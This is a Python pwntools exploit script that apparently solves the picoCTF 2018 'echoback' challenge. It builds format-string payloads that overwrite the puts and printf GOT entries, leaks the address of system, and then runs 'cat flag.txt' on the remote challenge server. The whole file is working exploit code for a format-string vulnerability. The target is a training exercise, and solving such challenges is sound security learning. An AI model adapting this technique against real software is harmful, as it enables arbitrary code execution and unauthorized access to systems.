#!/usr/bin/env python

from pwn import *


debug = 0


def write_memory(address, value):
  v1 = (value & 0x0000FFFF) - 8
  v2 = (value >> 16) - (value & 0x0000FFFF)

  if v2 < 0:
    v2 += 0x00010000

  ret = p32(address) + p32(address + 2) + '%{}x'.format(v1) + '%7$hn'

  if v2 != 0:
    ret += '%{}x'.format(v2)

  ret += '%8$hn'

  return ret

if debug:
  p = process('./echoback')
else:
  p = remote('2018shell.picoctf.com', 56800)

binary = ELF('./echoback')

p.recvuntil('input your message:')

# Override puts@got with vuln
log.info('Overriding puts@got with vuln')
payload = write_memory(binary.symbols['got.puts'], binary.symbols['vuln'])
p.sendline(payload)

p.recvuntil('input your message:')

log.info('Leaking address of system')
p.sendline(p32(binary.symbols['got.system']) + "." + "%7$s" + ".")
leaked_system = p.recvuntil('input your message:')
leaked_system = unpack(leaked_system.split('.')[1][:4], 32, endian='little')
log.info('Leaked system address: {}'.format(hex(leaked_system)))

# Override printf@got with system@got
log.info('Overriding printf@got with system@got')
payload = write_memory(binary.symbols['got.printf'], leaked_system)
log.info(payload)

p.sendline(payload)

p.recvuntil('input your message:')

p.sendline('cat flag.txt')
print p.recvuntil('}')
p.close()